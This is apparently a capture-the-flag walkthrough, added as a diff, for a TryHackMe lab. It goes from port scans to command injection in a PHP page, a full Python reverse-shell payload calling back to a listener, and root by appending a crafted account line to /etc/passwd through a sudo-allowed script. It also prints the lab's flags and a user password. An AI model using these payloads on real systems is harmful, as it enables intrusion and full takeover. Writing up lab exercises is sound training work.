@@ -1,0 +1,180 @@
+Main IP :: 10.48.176.66
+
+
+So today our main task is to solve another lab which is yueiua from thm and we got the IP too running a full port scan.
+
+Nmap scan report for 10.48.176.66
+Host is up (0.00011s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Will run service and version scan parallel which will help us get more information.
+
+Nmap scan report for 10.48.176.66
+Host is up, received echo-reply ttl 64 (0.00024s latency).
+Scanned at 2026-05-15 04:21:43 BST for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: U.A. High School
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+moving ahead with this visiting the web page and looking for more.
+
+After lot of fuzzing lot of directory scan we finally come to 
+
+http://10.48.176.66/assets/index.php?cmd=whoami
+
+where we "d3d3LWRhdGEK" get this 
+
+So with this
+
+GET /assets/index.php?cmd=python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.48.109.4",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")' HTTP/1.1
+Host: 10.48.176.66
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=gsuo09j6rrugpcdnrmf3g62ujk
+Connection: keep-alive
+
+we get 
+
+~# nc -lvnp 4444
+Listening on 0.0.0.0 4444
+
+Connection received on 10.48.176.66 44184
+
+www-data@ip-10-48-176-66:/var/www/html/assets$ 
+www-data@ip-10-48-176-66:/var/www/html/assets$ 
+
+ python3 -c import pty;pty.spawn(/bin/bash)
+<me/deku$ python3 -c import pty;pty.spawn(/bin/bash)
+bash: syntax error near unexpected token `/bin/bash'
+www-data@ip-10-48-176-66:/home/deku$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<eku$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ip-10-48-176-66:/home/deku$ ^Z
+[1]+  Stopped                 nc -lvnp 4444
+root@ip-10-48-79-31:~# stty raw -echo; fg
+nc -lvnp 4444
+
+www-data@ip-10-48-176-66:/home/deku$ export TERM=xterm
+
+
+Shell stabilized
+
+rwxr-xr-x  4 www-data www-data 4.0K Dec 13  2023 .
+drwxr-xr-x 14 root     root     4.0K Jul  9  2023 ..
+drwxrwxr-x  2 www-data www-data 4.0K Jul  9  2023 Hidden_Content
+drwxr-xr-x  3 www-data www-data 4.0K Dec 13  2023 html
+www-data@ip-10-48-176-66:/var/www$ cd Hidden_Content/
+www-data@ip-10-48-176-66:/var/www/Hidden_Content$ ls
+passphrase.txt
+www-data@ip-10-48-176-66:/var/www/Hidden_Content$ ls -lah
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Jul  9  2023 .
+drwxr-xr-x 4 www-data www-data 4.0K Dec 13  2023 ..
+-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
+www-data@ip-10-48-176-66:/var/www/Hidden_Content$ cat passphrase.txt 
+QWxsbWlnaHRGb3JFdmVyISEhCg== -> AllmightForEver!!!
+
+
+we get this and looks alike base64
+
+$ cd /var/www/html/assets/images/
+www-data@ip-10-48-176-66:/var/www/html/assets/images$ ls
+oneforall.jpg  yuei.jpg
+
+
+let's get the images and see if any of that have something in them
+
+ exiftool oneforall.jpg -v
+  ExifToolVersion = 12.48
+  FileName = oneforall.jpg
+  Directory = .
+  FileSize = 98264
+  FileModifyDate = 1688920925
+  FileAccessDate = 1778817690
+  FileInodeChangeDate = 1778817690
+  FilePermissions = 33188
+  FileType = PNG
+  FileTypeExtension = PNG
+  MIMEType = image/png
+  Warning = PNG image did not start with IHDR
+  Warning = Bad CRC for .. chunk
+PNG  (1 bytes):
+  Warning = Invalid PNG chunk size
+
+Your file is named .jpg, but the header starts with:
+
+89 50 4E 47 0D 0A 1A 0A
+
+That is a PNG signature, not JPEG/JFIF.
+
+A valid JPEG/JFIF starts with:
+
+FF D8 FF E0 00 10 4A 46 49 46
+i used hexeditor to change that setting and moving ahead.
+
+After this we have known that there we got passphrase let's get the password for deku using steghide and passphrase.
+
+deku -> One?For?All_!!one1/A
+
+and we have user.txt
+THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
+
+
+PRIVILEDGE ESCALATION TIME
+
+sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on ip-10-48-176-66:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User deku may run the following commands on ip-10-48-176-66:
+    (ALL) /opt/NewComponent/feedback.sh
+
+and we see this for first.
+
+deku ALL=(ALL:ALL) NOPASSWD: ALL
+
+deku ALL-NOPASSWD:ALL >>/etc/sudoers
+
+'naval:$1$cncEdmjn$eQwVGNcZ/KpyZlCBHP8Gc0:0:0:jxf:/root:/bin/bash' >> /etc/passwd
+
+ sudo ./feedback.sh 
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+'naval:$1$cncEdmjn$eQwVGNcZ/KpyZlCBHP8Gc0:0:0:jxf:/root:/bin/bash' >> /etc/passwd
+It is This:
+Feedback successfully saved.
+deku@ip-10-48-156-202:/opt/NewComponent$ su naval
+Password: 
+root@ip-10-48-156-202:/opt/NewComponent# cat /root/root.txt 
+root@myheroacademia:/opt/NewComponent# cat /root/root.txt
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                  _    _ 
+             _   _        ___    | |  | |
+            | \ | | ___  /   |   | |__| | ___ _ __  ___
+            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
+            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
+            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
+
+THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
+
+This is the best way to be root and get the flag.
